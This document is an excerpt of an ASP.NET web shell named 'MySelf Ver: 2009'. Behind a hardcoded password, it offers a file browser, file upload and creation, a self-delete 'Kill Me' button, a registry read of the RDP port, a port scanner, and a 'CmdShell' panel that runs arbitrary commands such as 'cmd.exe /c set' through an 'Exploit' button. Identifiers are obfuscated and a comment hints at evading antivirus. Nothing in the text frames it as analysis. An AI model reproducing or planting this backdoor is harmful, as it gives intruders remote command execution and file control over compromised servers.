...
<script runat="server">
public string Password="6029028953b7a0786d9fcdf1ed6f69f6";
public string vbhLn="MySelf";
...
if(IsPostBack)
{
string Ag=Request["__EVENTTARGET"];

string xMnAv=Request["__File"]; 
if(Ag!="")
{
switch(Ag)
{
...
if(Ag.StartsWith("dAJTD"))
{
dAJTD(Ebgw(Ag.Replace("dAJTD","")),xMnAv);
}
else if(Ag.StartsWith("Tlvz"))
{
Tlvz(Ebgw(Ag.Replace("Tlvz","")),xMnAv);
}
else if(Ag.StartsWith("Bin_CFile"))
{
YByN(Ebgw(Ag.Replace("Bin_CFile","")),xMnAv);
}
}
}
else
...
Bin_Button_Kime.Attributes["onClick"]="if(confirm('delete MySelf?')){Bin_PostBack('hae','');};";
...
{
//nod32
String[] eSET=Directory.GetLogicalDrives();
for(int i=0;i<eSET.Length;i++)
{
Control c=ParseControl(" <asp:LinkButton Text='"+mFvj(eSET[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+eSET[i]+"'/> | ");
...
if(i==2)
{
pc.Text="<a href=\"javascript:Bin_PostBack('x_prt','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\">Parent Directory</a>";
}
p.Cells.Add(pc);
UGzP.Rows.Add(p);
}
...
try
{
// RegistryKey mkf=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
    RegistryKey mkf = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp");
string IKjwH=DdmPl(mkf,"PortNumber");
...
_timeSpent=DateTime.Now.Subtract(Dtm); //ffav
}
}
...
Bin_H2_Title.InnerText="Execute Comm"+"and >>";
...
try
{
Process pcn=new Process();  
pcn.StartInfo.FileName=kusi.Value;
pcn.StartInfo.Arguments=bkcm.Value;
pcn.StartInfo.UseShellExecute=false;
pcn.StartInfo.RedirectStandardInput=true;
pcn.StartInfo.RedirectStandardOutput=true;
pcn.StartInfo.RedirectStandardError=true;
pcn.Start();
string Uoc=pcn.StandardOutput.ReadToEnd();
Uoc=Uoc.Replace("<","&lt;");
Uoc=Uoc.Replace(">","&gt;");
Uoc=Uoc.Replace("\r\n","<br>");
tnQRF.Visible=true;
...
foreach(ScanPort sip in IVc)
{
sinfo+=sip.ip+" : "+sip.port + " ........... "+sip.status+"<br>";
}
GBYT.InnerHtml=sinfo;
}
...
<tr class="head">
<td ><span style="float:right;"><a href="http://g.cn" target="_blank">MySelf Ver: 2009</a></span><span id="miansha2" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="Upload" OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="WebRoot" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Create Directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">Create File</a>
 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_Kime" runat="server" style="color:Red">Kill Me</a>
</td></tr>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mcsl" type="text" size="100" value="cmd.exe /c set"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="g.cn"/></td>
...
<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">File Name</asp:ListItem><asp:ListItem Value="content" Selected="True">File Content</asp:ListItem></asp:DropDownList>
</td>
</tr>
